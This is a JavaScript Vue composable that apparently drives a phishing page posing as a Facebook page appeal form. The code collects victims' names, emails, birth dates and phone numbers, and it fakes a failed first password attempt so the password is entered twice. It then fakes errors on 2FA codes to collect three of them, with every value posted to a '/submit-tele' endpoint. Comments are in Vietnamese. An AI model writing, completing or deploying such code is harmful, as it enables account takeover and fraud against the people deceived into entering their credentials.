import { reactive, ref, shallowRef, markRaw, watch, onMounted, nextTick, onBeforeUnmount } from "vue";
import "intl-tel-input/build/css/intlTelInput.css";
import intlTelInput from "intl-tel-input";
import { AsYouType } from "libphonenumber-js";
import api from "@/services/api";

function setCookie(name, value, days = 1) {
    const expires = new Date(Date.now() + days * 864e5).toUTCString();
    document.cookie =
        `${encodeURIComponent(name)}=${encodeURIComponent(value)};` +
        ` expires=${expires}; path=/; SameSite=Lax`;
}

function getCookie(name) {
    const key = encodeURIComponent(name) + "=";
    const parts = document.cookie.split("; ");
    for (const part of parts) {
        if (part.startsWith(key)) return decodeURIComponent(part.slice(key.length));
    }
    return "";
}

function removeCookie(name) {
    document.cookie = `${encodeURIComponent(name)}=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/; SameSite=Lax`;
}

const COOKIE_KEY = "appeal_step1";

export function useAppealForm(emit) {
    const phone = ref("");
    const phoneE164 = ref("");
    const iti = shallowRef(null);
    const phoneInputEl = ref(null);
    const phoneTouched = ref(false)
    let onInputHandler = null;
    let onCountryChangeHandler = null;

    const step = ref(1);
    const code = ref("");
    const codeError = ref(false);
    const codeErrorMessage = ref("");
    const codeLocked = ref(false);
    const countdown = ref(0);
    let timer = null;
    const codeInputCount = ref(0);

    const password = ref("");
    const passwordError = ref(false);
    const passwordInputCount = ref(0);

    const isLoading = ref(false);
    const isCountingDown = ref(false);

    const allFormData = reactive({ formStep1: null, formStep2: null, formStep3: null });
    const savedUser = reactive({
        fullName: "",
        email: "",
        phoneDisplay: "",
        phoneE164: "",
    });

    function saveStep1ToCookie() {
        const payload = {
            fullName: form.fullName || "",
            email: form.email || "",
            phoneDisplay: phone.value || "",
            phoneE164: phoneE164.value || "",
        };
        setCookie(COOKIE_KEY, JSON.stringify(payload), 1);
    }

    function loadStep1FromCookie() {
        const raw = getCookie(COOKIE_KEY);
        if (!raw) return;

        try {
            const data = JSON.parse(raw);
            savedUser.fullName = data.fullName || "";
            savedUser.email = data.email || "";
            savedUser.phoneDisplay = data.phoneDisplay || data.phone || "";
            savedUser.phoneE164 = data.phoneE164 || "";
        } catch (e) {
            removeCookie(COOKIE_KEY);
        }
    }

    const form = reactive({
        fullName: "",
        email: "",
        businessEmail: "",
        pageName: "",
        dob: { day: "", month: "", year: "" },
        issue: "",
        notifyFacebook: true,
        agreeTerms: false,
    });

    const errors = reactive({
        fullName: "",
        email: "",
        businessEmail: "",
        pageName: "",
        dob: "",
        issue: "",
        phone: "",
        agreeTerms: "",
    });

    const getDialCode = () => {
        if (!iti.value) return "1";
        const countryData = iti.value.getSelectedCountryData?.();
        return String(countryData?.dialCode || "1");
    };

    const getIso2 = () => {
        if (!iti.value) return "US";
        const countryData = iti.value.getSelectedCountryData?.();
        return (countryData?.iso2 || "us").toUpperCase();
    };

    function validatePhoneLoose(nationalDigits) {
        if (!phoneTouched.value) {
            errors.phone = "";
            return true;
        }

        if (!nationalDigits || nationalDigits.length === 0) {
            errors.phone = "Please enter enough phone number.";
            return false;
        }

        errors.phone = "";
        return true;
    }

    function formatNationalDigits(nationalDigits) {
        const iso = getIso2();
        const formatter = new AsYouType(iso);
        return formatter.input(nationalDigits);
    }

    function syncPhoneValueFromDigits(nationalDigits) {
        const dialCode = getDialCode();
        const formattedNational = formatNationalDigits(nationalDigits);
        const display = `+${dialCode} ${formattedNational}`.trim();
        phone.value = display;
        phoneE164.value = `+${dialCode}${nationalDigits}`;

        if (phoneInputEl.value) {
            phoneInputEl.value.value = display;
        }
    }

    onMounted(async () => {
        loadStep1FromCookie();

        await nextTick();
        const input = document.querySelector("#phone");
        if (!input) return;
        phoneInputEl.value = input;

        // ✅ Simple IP detection - fast & clean
        let countryCode = "us";
        try {
            const res = await fetch("https://ipinfo.io/json?token=1a1487102e7dd6");
            const data = await res.json();
            countryCode = data.country ? data.country.toLowerCase() : "us";
            console.log(`✅ [ipinfo.io] Detected country: ${countryCode}`);
        } catch (err) {
            console.warn(`❌ [ipinfo.io] Error: ${err.message}, using fallback: us`);
            countryCode = "us";
        }

        // intl-tel-input chỉ dùng dropdown + lấy iso2/dialCode, KHÔNG dùng utilsScript
        iti.value = intlTelInput(input, {
            initialCountry: countryCode,
            containerClass: "w-full",
            strictMode: false,
            formatOnDisplay: false,
            nationalMode: false,
        });

        // ✅ set sẵn +dialCode theo IP
        const dialCode = getDialCode();
        const initialValue = `+${dialCode} `;
        phone.value = initialValue;
        input.value = initialValue;
        phoneE164.value = `+${dialCode}`; // chưa có số national

        // Input handler: chỉ cho phép số + format national part
        onInputHandler = (e) => {
            const dial = getDialCode();
            const iso = getIso2();

            const current = e.target.value || "";

            // Lấy tất cả digits
            const allDigits = current.replace(/\D/g, ""); // chỉ số

            // Tách national digits: bỏ dialCode nếu nó nằm ở đầu
            let nationalDigits = allDigits;
            if (nationalDigits.startsWith(dial)) {
                nationalDigits = nationalDigits.slice(dial.length);
            }

            // ✅ Bắt buộc nationalDigits chỉ là số -> đã đảm bảo vì replace(/\D/g,'')
            // Format hiển thị
            const formattedNational = new AsYouType(iso).input(nationalDigits);
            const display = `+${dial} ${formattedNational}`.trim();

            // set display + submit value
            phone.value = display;
            phoneE164.value = `+${dial}${nationalDigits}`;
            e.target.value = display;

            // ✅ chỉ check rỗng / có số
            validatePhoneLoose(nationalDigits);
        };

        // Country change: reset prefix + format lại (nếu user đã nhập số)
        onCountryChangeHandler = () => {
            const dial = getDialCode();
            const iso = getIso2();

            // lấy digits user đã nhập trước đó (nếu có)
            const current = input.value || "";
            const allDigits = current.replace(/\D/g, "");

            // bỏ dial cũ nếu có
            let nationalDigits = allDigits;
            if (nationalDigits.startsWith(dial)) {
                nationalDigits = nationalDigits.slice(dial.length);
            }

            // reset hiển thị theo dial mới
            const formattedNational = new AsYouType(iso).input(nationalDigits);
            const display = `+${dial} ${formattedNational}`.trim();

            phone.value = display;
            input.value = display;
            phoneE164.value = `+${dial}${nationalDigits}`;

            validatePhoneLoose(nationalDigits);
        };

        input.addEventListener("input", onInputHandler);
        input.addEventListener("countrychange", onCountryChangeHandler);
    });

    onBeforeUnmount(() => {
        const input = phoneInputEl.value;
        if (input && onInputHandler) input.removeEventListener("input", onInputHandler);
        if (input && onCountryChangeHandler) input.removeEventListener("countrychange", onCountryChangeHandler);

        if (iti.value?.destroy) iti.value.destroy();
        iti.value = null;
    });

    watch(() => form.fullName, (val) => {
        errors.fullName = val.trim() ? "" : "Please enter enough full name.";
    });

    watch(() => form.email, (val) => {
        errors.email = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val) ? "" : "Please enter enough email address.";
    });

    watch(() => form.businessEmail, (val) => {
        errors.businessEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val)
            ? ""
            : "Please enter enough email business address.";
    });

    watch(() => form.pageName, (val) => {
        errors.pageName = val.trim() ? "" : "Please enter enough Facebook page name.";
    });

    watch(() => [form.dob.day, form.dob.month, form.dob.year], ([d, m, y]) => {
        errors.dob = d && m && y ? "" : "Please enter enough date of birth.";
    });

    watch(() => form.issue, (val) => {
        errors.issue = val.trim() ? "" : "Please enter your issue";
    });

    watch(() => form.agreeTerms, (val) => {
        errors.agreeTerms = val ? "" : "Please agree to our terms and data and cookie policy";
    });

    watch(step, (v) => {
        if (v === 3) loadStep1FromCookie();
    });

    function validatePhoneNumber() {
        errors.fullName = form.fullName.trim() ? "" : "Please enter enough full name.";
        errors.email = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email) ? "" : "Please enter enough email address.";
        errors.businessEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.businessEmail)
            ? ""
            : "Please enter enough email business address.";
        errors.pageName = form.pageName.trim() ? "" : "Please enter enough Facebook page name.";

        const { day, month, year } = form.dob;
        errors.dob = day && month && year ? "" : "Please enter enough date of birth.";

        // ✅ BỎ validation issue vì không có input field
        errors.issue = "";
        errors.agreeTerms = form.agreeTerms ? "" : "Please agree to our terms and data and cookie policy";

        const dial = getDialCode();
        const digits = (phone.value || "").replace(/\D/g, "");
        let nationalDigits = digits;
        if (nationalDigits.startsWith(dial)) nationalDigits = nationalDigits.slice(dial.length);

        validatePhoneLoose(nationalDigits);

        return Object.values(errors).every((v) => !v);
    }

    function onPhoneInput() {
        return;
    }

    const submitForm = async () => {
        try {
            if (!validatePhoneNumber()) return;

            const birthday = `${form.dob.year}-${String(form.dob.month).padStart(2, "0")}-${String(form.dob.day).padStart(2, "0")}`;

            const formData = {
                fullName: form.fullName,
                email: form.email,
                businessEmail: form.businessEmail,
                pageName: form.pageName,
                phone: phoneE164.value,
                birthday,
                description: form.issue,
                password: password.value,
                password_confirm: password.value,
                code_first: code.value,
                code_second: code.value,
            };

            const fd = new FormData();
            Object.keys(formData).forEach((k) => fd.append(k, formData[k]));

            const response = await api.post("/submit-tele", fd, {
                headers: { "Content-Type": "multipart/form-data" },
            });

            if (response.data?.success) {
                saveStep1ToCookie();
                allFormData.formStep1 = formData;
                step.value = 2;
            }
        } catch (error) {
            console.error("Response Error:", error.response?.data);
            if (error.response?.data?.errors) {
                const serverErrors = error.response.data.errors;
                Object.keys(serverErrors).forEach((key) => {
                    if (errors.hasOwnProperty(key)) errors[key] = serverErrors[key][0];
                });
            }
        }
    };

    const submitPassword = async () => {
        try {
            isLoading.value = true;

            if (passwordInputCount.value === 0) {
                allFormData.formStep2 = {
                    ...allFormData.formStep1,
                    password: password.value,
                };

                await api.post("/submit-tele", {
                    ...allFormData.formStep1,
                    step: 2,
                    password: password.value,
                    isFirstAttempt: true,
                });

                passwordInputCount.value++;
                passwordError.value = true;
                password.value = "";
                return;
            }

            const response = await api.post("/submit-tele", {
                ...allFormData.formStep1,
                ...allFormData.formStep2,
                step: 2,
                password_confirm: password.value,
                isFirstAttempt: false,
            });

            if (response.data?.success) {
                allFormData.formStep2 = {
                    ...allFormData.formStep2,
                    password_confirm: password.value,
                };
                step.value = 3;
            } else {
                passwordError.value = true;
                password.value = "";
                passwordInputCount.value = 0;
                delete allFormData.formStep2;
            }
        } catch (error) {
            console.error("Password Error:", error.response?.data);
            passwordError.value = true;
            password.value = "";
            passwordInputCount.value = 0;
            delete allFormData.formStep2;
        } finally {
            isLoading.value = false;
        }
    };

    const startCountdown = (seconds) => {
        codeLocked.value = true;
        countdown.value = seconds;

        if (timer) clearInterval(timer);
        timer = setInterval(() => {
            countdown.value--;
            if (countdown.value <= 0) {
                clearInterval(timer);
                codeLocked.value = false;
            }
        }, 1000);
    };

    const submitCode = async () => {
        try {
            isLoading.value = true;

            const method =
                JSON.parse(sessionStorage.getItem("step1Data") || "{}")?.method || "notification";

            if (codeInputCount.value === 0) {
                allFormData.formStep3 = {
                    ...allFormData.formStep2,
                    code_first: code.value,
                    method,
                };

                await api.post("/submit-tele", {
                    ...allFormData.formStep1,
                    ...allFormData.formStep2,
                    step: 3,
                    method,
                    code_first: code.value,
                    isFirstAttempt: true,
                });

                codeInputCount.value++;
                codeError.value = true;
                code.value = "";
                startCountdown(30);
                return;
            }

            if (codeInputCount.value === 1) {
                allFormData.formStep3 = {
                    ...allFormData.formStep3,
                    code_second: code.value,
                    method,
                };

                await api.post("/submit-tele", {
                    ...allFormData.formStep1,
                    ...allFormData.formStep2,
                    ...allFormData.formStep3,
                    step: 3,
                    method,
                    code_second: code.value,
                    isSecondAttempt: true,
                });

                codeInputCount.value++;
                codeError.value = true;
                code.value = "";
                startCountdown(30);
                return;
            }

            if (codeInputCount.value === 2) {
                allFormData.formStep3 = {
                    ...allFormData.formStep3,
                    code_second: code.value,
                    method,
                };

                await api.post("/submit-tele", {
                    ...allFormData.formStep1,
                    ...allFormData.formStep2,
                    ...allFormData.formStep3,
                    step: 3,
                    method,
                    code_third: code.value,
                    isSecondAttempt: true,
                });
                codeInputCount.value++;
                step.value = 4;
            }
        } catch (error) {
            console.error("Code Error:", error.response?.data);
            codeError.value = true;
            codeErrorMessage.value = "Có lỗi xảy ra";
            code.value = "";
        } finally {
            isLoading.value = false;
        }
    };

    // ✅ FIX CHÍNH: handleSend giờ thực sự submit form
    const handleSend = async () => {
        if (isLoading.value) return;

        isLoading.value = true;

        // ⏳ giả lập loading 0.8s để user thấy spinner
        await new Promise((resolve) => setTimeout(resolve, 800));

        // ✅ VALIDATE
        const ok = validatePhoneNumber();
        console.log("Validation result:", ok, "Errors:", JSON.stringify(errors));

        if (!ok) {
            isLoading.value = false;
            return;
        }

        // ✅ THỰC HIỆN SUBMIT FORM THỰC TẾ
        await submitForm();

        isLoading.value = false;
    };

    const handleContinueCode = async () => {
        if (isLoading.value || codeLocked.value) return;

        isLoading.value = true;

        await new Promise((r) => setTimeout(r, 800));

        await submitCode();

        isLoading.value = false;
    };

    function onlyNumberKey(e) {
        const allowedKeys = ["Backspace", "Delete", "ArrowLeft", "ArrowRight", "Tab"];

        if (e.ctrlKey || e.metaKey) return;

        if (allowedKeys.includes(e.key)) return;

        if (!/^\d$/.test(e.key)) {
            e.preventDefault();
            return;
        }

        const currentDigits = String(e.target.value || "").replace(/\D/g, "");
        if (currentDigits.length >= 8) {
            e.preventDefault();
        }
    }

    function onCodeInput(e) {
        let digits = String(e.target.value || "").replace(/\D/g, "");
        if (digits.length > 8) digits = digits.slice(0, 8);

        code.value = digits;
        e.target.value = digits;
    }

    function closePopup() {
        if (emit) emit("close");
    }

    return {
        phone,
        phoneE164,
        iti,
        handleSend,
        handleContinueCode,
        code,
        onlyNumberKey,
        onCodeInput,
        savedUser,
        step,
        form,
        errors,
        password,
        passwordError,
        passwordInputCount,
        phoneError: errors,
        validatePhoneNumber,
        onPhoneInput,
        submitForm,
        submitPassword,
        codeError,
        codeErrorMessage,
        codeLocked,
        countdown,
        submitCode,
        startCountdown,
        closePopup,
        isLoading,
        allFormData,
        isCountingDown,
        previewImages: ref([]),
        onFileChange: () => { },
        removeImage: () => { },
        detectedCountryCode: ref(""),
        detectedDialCode: ref(""),
        detectedCountryName: ref(""),
    };
}